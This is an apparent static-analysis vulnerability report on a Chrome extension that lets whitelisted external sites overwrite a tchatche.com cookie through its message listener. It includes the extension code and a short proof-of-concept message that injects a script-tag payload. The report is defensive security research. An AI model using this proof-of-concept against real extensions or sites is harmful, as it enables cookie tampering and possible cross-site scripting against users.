# CoCo Analysis: kmoepdbfinjnjkneijdpkmcdgbpehgho

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink

**CoCo Trace:**
```
from bg_chrome_runtime_MessageExternal to chrome_cookies_set_sink
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kmoepdbfinjnjkneijdpkmcdgbpehgho/opgen_generated_files/bg.js
Line 1051	    if (typeof request.keyword !== 'undefined' && request.keyword != '') {
	request.keyword
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kmoepdbfinjnjkneijdpkmcdgbpehgho/opgen_generated_files/bg.js
Line 1058	              cookieJson = encodeURIComponent(JSON.stringify(cookieJson));
	encodeURIComponent(JSON.stringify(cookieJson))
```

**Code:**

```javascript
// Background script (bg.js) - Lines 965-1073
var urlDom = "https://www.tchatche.com";
var cokDom = "searchOptions";

chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
  if (request == 'version') {
    const manifest = chrome.runtime.getManifest();
    sendResponse({ type: 'success', version: manifest.version });
    return true;
  }
  if (typeof request.action !== 'undefined' && request.action == 'search') {
    if (typeof request.keyword !== 'undefined' && request.keyword != '') {  // ← attacker-controlled input
      chrome.storage.sync.get({eS: false}, function (items) {
        if(items.eS == true) {
          // Gets existing cookie
          chrome.cookies.get({ url: urlDom, name: cokDom }, function (cookie) {
            if (cookie !== null) {
              var cookieJson = JSON.parse(decodeURIComponent(cookie.value));
              cookieJson.name = request.keyword;  // ← attacker controls this value
              cookieJson = encodeURIComponent(JSON.stringify(cookieJson));

              // Sets cookie with attacker-controlled data
              chrome.cookies.set({
                url: urlDom,  // https://www.tchatche.com
                name: cokDom,
                value: cookieJson  // ← contains attacker-controlled keyword
              }, function (cookie) {
                if (cookie !== null) sendResponse({ type: 'success', goto: urlSch });
              });
            }
          });
        }
      });
      sendResponse({ type: 'fail', goto: urlSch });
    }
    return true;
  }
  sendResponse({ type: 'fail' });
  return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious website sends external message to this extension
// Extension ID: kmoepdbfinjnjkneijdpkmcdgbpehgho
// This works from domains whitelisted in manifest: *.tchatche.com, *.securery.com

chrome.runtime.sendMessage(
    "kmoepdbfinjnjkneijdpkmcdgbpehgho",
    {
        action: "search",
        keyword: "malicious_payload_here<script>alert(1)</script>"
    },
    function(response) {
        console.log("Cookie manipulation response:", response);
        // Response: { type: 'success', goto: 'https://www.tchatche.com/Chat#/search' }
    }
);
```

**Impact:** Cookie manipulation vulnerability. External websites (whitelisted domains: *.tchatche.com, *.securery.com) can arbitrarily set the value of the "searchOptions" cookie on tchatche.com by providing malicious payloads in the `keyword` parameter. This allows attackers to inject arbitrary data into the cookie, potentially leading to XSS if the cookie value is later used in an unsafe context, or to manipulate the application's search functionality in unintended ways.
